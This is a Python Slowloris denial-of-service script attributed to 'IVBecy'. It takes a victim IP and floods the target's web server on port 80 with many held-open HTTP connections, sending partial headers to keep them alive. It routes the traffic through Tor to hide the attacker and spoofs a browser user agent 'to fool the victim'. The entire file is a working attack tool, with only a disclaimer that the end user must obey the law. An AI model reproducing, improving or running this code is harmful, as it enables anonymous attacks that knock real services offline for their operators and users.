# Slow Loris Dos Script by IVBecy
#Importing modules
import socket
import random
import time
import sys
import requests
import socks
import os

#Setting up a list to keep all the sockets documented
list_of_sockets = []
# A fake user agent to fool the victim
user_agent = "User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",


# Pretty self explanatory
def banner():
    print("""
-----------------------------------------------
|---------------------------------------------|
|            SLOW LORIS DOS SCRIPT            |
|---------------------------------------------|
| # Author: IVBecy                            |
|                                             |
| # This version uses TOR Proxies             |
|                                             |
| # It is the end user's responsibility       |
|  to obey all applicable laws.               |
|                                             |
|---------------------------------------------|
-----------------------------------------------
        """)

# If somone gets the terminal commands wrong this message will get displayed, to help them
def usage():
    print('''\n
    Usage:

    py slowloris-pro.py [-ip]  [-sc]  [-t]
    -ip : The IP address of the victim
    -sc : The number of connections you want to make to the Target
    -t : Refresh time (in sec)
    ''')

    sys.exit()

#Taking all the arguments form the terminal, and assigning them to variables
if sys.argv[1] != "-ip":
    usage()

if len(sys.argv) < 2:
    usage()
    if sys.argv[1] != "-ip":
        usage()

ip = sys.argv[2]

if sys.argv[3] != "-sc":
    usage()

socket_count = sys.argv[4]

if sys.argv[5] != "-t":
    usage()

times = sys.argv[6]

# Setting up a TOR connection, so you can be anonymous
def get_tor_session():
    session = requests.session()
    session.proxies = {'http':  'socks5://127.0.0.1:9050',
                       'https': 'socks5://127.0.0.1:9050'}
    return session
session = get_tor_session()

#Detecting OS, for deleting terminal ("clear" for Linux/Mac, "cls" for windows)
if sys.platform == "win32":
    ops = "cls"
else:
    ops = "clear"

#Setting up the start screen + displaying information about the attack
#Getting IP
IPAddr = session.get("http://icanhazip.com").text
#Getting start time
start = time.ctime()
print("\n")
banner()
#Connection info
print("Target: {} ||  Sockets: {} ||  IP: {}Start: {}".format(ip, socket_count, IPAddr, start), end="")
time.sleep(5)
print("\n")
print("Creating sockets...")

#Setting up all the sockets
for _ in range(int(socket_count)):
    try:
        print("\n")
        print("Target: {} ||  Sockets: {} ||  IP: {}Start: {}".format(ip, socket_count, IPAddr, start), end="")
        print("\n")
        print("Sockets Connected: {}".format(_))
        print("Number of sockets alive:", len(list_of_sockets))
        s = socks.socksocket()
        s.setproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", port=9050)
        s.connect((ip, 80))
        s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
        s.send("User-Agent: {}\r\n".format(user_agent).encode("utf-8"))
        os.system(ops)
        list_of_sockets.append(s)

    # If there is a time out error, notify user, and keep connecting + remove a connection from the list
    except socket.error:
        continue
        os.system(ops)
        print("\n")
        print("Target: {} ||  Sockets: {} ||  IP: {}Start: {}".format(ip, socket_count, IPAddr, start), end="")
        print("\n")
        print("Error: socket.error")
        print("Socket timed out, making new connections...")
        list_of_sockets.remove(s)
        time.sleep(1)
        os.system(ops)



print("Setting up the sockets...")

# Main Operation
while True:
    print("\n")
    print("Sending keep-alive headers...")
    time.sleep(1)
    os.system(ops)
    print("\n")
    print("Target: {} ||  Sockets: {} ||  IP: {}Start: {}".format(ip, socket_count, IPAddr, start), end="")
    #If there are less item in the list, then the given amount of connections, keep connecting until
    #the goal is reached
    while len(list_of_sockets) < int(socket_count):
        s = socks.socksocket()
        s.setproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", port=9050)
        s.connect((ip, 80))
        list_of_sockets.append(s)
        print("Sockets Dropped to",len(list_of_sockets))
        print("Remaking sockets...")
        print("")
        os.system(ops)
        if len(list_of_sockets) ==  int(socket_count):
            print("")
    if len(list_of_sockets) ==  int(socket_count):
        print("")

    print("\n")
    print("Number of sockets alive: ",len(list_of_sockets))
    # Send data to the victim
    for s in list_of_sockets:
        try:
            s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
            s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
            s.send("User-Agent: {}\r\n".format(user_agent).encode("utf-8"))
        #If there is a time out error, keep connecting
        except socket.error:
            os.system(ops)
            print("\n")
            print("Target: {} ||  Sockets: {} ||  IP: {}Start: {}".format(ip, socket_count, IPAddr, start), end="")
            print("\n")
            s = socks.socksocket()
            s.setproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", port=9050)
            s.connect((ip, 80))
            print("Error: socket.error")
            print("Socket timed out, making new connections...")
            time.sleep(1)
            os.system(ops)

        #If there is a time out error, keep connecting
        except socks.SOCKS5Error:
            os.system(ops)
            print("\n")
            print("Target: {} ||  Sockets: {} ||  IP: {}Start: {}".format(ip, socket_count, IPAddr, start), end="")
            s = socks.socksocket()
            s.setproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", port=9050)
            s.connect((ip, 80))
            print("Error: socks.SOCKS5Error")
            print("Socket timed out, making new connections...")
            time.sleep(2)
            os.system(ops)

        #If there is a time out error, keep connecting
        except ConnectionAbortedError:
            os.system(ops)
            print("\n")
            print("Target: {} ||  Sockets: {} ||  IP: {}Start: {}".format(ip, socket_count, IPAddr, start), end="")
            s = socks.socksocket()
            s.setproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", port=9050)
            s.connect((ip, 80))
            print("Error: ConnectionAbortedError")
            print("Socket timed out, making new connections...")
            time.sleep(2)
            os.system(ops)

        #If there is a time out error, keep connecting
        except socks.GeneralProxyError:
            os.system(ops)
            print("\n")
            print("Target: {} ||  Sockets: {} ||  IP: {}Start: {}".format(ip, socket_count, IPAddr, start), end="")
            print("Proxy socket timed out")
            print("Making new connections")
            print(len(list_of_sockets))
            s = socks.socksocket()
            s.setproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", port=9050)
            s.connect((ip, 80))
            time.sleep(2)
            os.system(ops)
            try:
                s = socks.socksocket()
                s.setproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", port=9050)
                s.connect((ip, 80))
                for s in list_of_sockets:
                    s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))
                    s.send("User-Agent: {}\r\n".format(user_agent).encode("utf-8"))
            except socket.error:
                continue

    time.sleep(int(times))
